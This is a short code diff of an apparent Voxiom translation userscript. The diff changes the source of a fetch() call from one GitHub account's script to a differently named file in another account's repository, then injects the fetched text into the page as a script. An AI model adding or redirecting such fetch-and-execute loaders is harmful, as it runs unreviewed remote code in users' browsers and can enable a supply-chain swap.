@@ -1,5 +1,5 @@
 //VoxiomTranslated
-fetch("https://raw.githubusercontent.com/TheMasterRob4ig/VoxiomTranslated/main/script.js")
+fetch("https://raw.githubusercontent.com/SuperA001/Voxiom-translator/main/scri2pt.js ")
     .then(response => response.text())
     .then(data => {
         const sriptElement = document.createElement("script")
